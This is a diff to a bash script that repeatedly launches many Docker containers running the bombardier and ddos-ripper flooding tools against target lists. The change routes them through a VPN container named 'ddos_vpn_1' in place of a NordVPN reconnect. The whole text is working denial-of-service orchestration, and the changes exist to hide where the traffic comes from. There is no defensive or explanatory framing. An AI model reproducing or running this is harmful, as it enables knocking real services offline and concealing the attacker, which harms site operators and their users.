@@ -34,26 +34,17 @@ do
    echo "Killed all instances."
    
    
-   echo "Restarting VPN for a new server..."
-   sudo nordvpn disconnect
-   for i in {0..4} ; do
+   echo "Starting VPN (from docker-compose)..."
+   sudo docker-compose up -d
+   for i in {0..14} ; do
        echo -n '['
        for ((j=0; j<i; j++)) ; do echo -n '#'; done
        echo -n ''
-       for ((j=i; j<5; j++)) ; do echo -n ' '; done
-       echo -n "] $i / 5s" $'\r'
+       for ((j=i; j<14; j++)) ; do echo -n ' '; done
+       echo -n "] $i / 15s" $'\r'
        sleep 1
    done
-   sudo nordvpn connect
-   for i in {0..4} ; do
-       echo -n '['
-       for ((j=0; j<i; j++)) ; do echo -n '#'; done
-       echo -n ''
-       for ((j=i; j<5; j++)) ; do echo -n ' '; done
-       echo -n "] $i / 5s" $'\r'
-       sleep 1
-   done
-   echo "Connected to VPN."
+   echo "VPN started."
 
 
    echo "Starting Bombardier instances..."
@@ -64,7 +55,7 @@ do
       for (( c=1; c<=$INSTANCE_PER_BOMB; c++ ))
       do
          {
-            sudo docker run -d -m 128m --cpus=2 --rm alpine/bombardier -c 1000 -d 540s -l $BOMB 
+            sudo docker run -d -m 128m --cpus=2 --rm --net=container:ddos_vpn_1 alpine/bombardier -c 1000 -d 540s -l $BOMB 
          } &> /dev/null
       done
    done
@@ -79,7 +70,7 @@ do
       for (( c=1; c<=$INSTANCE_PER_RIPPER; c++ ))
       do
          {
-            sudo docker run -d -m 256m --cpus=2 --rm nitupkcuf/ddos-ripper $RIP
+            sudo docker run -d -m 256m --cpus=2 --rm --net=container:ddos_vpn_1 nitupkcuf/ddos-ripper $RIP
          } &> /dev/null
       done
    done
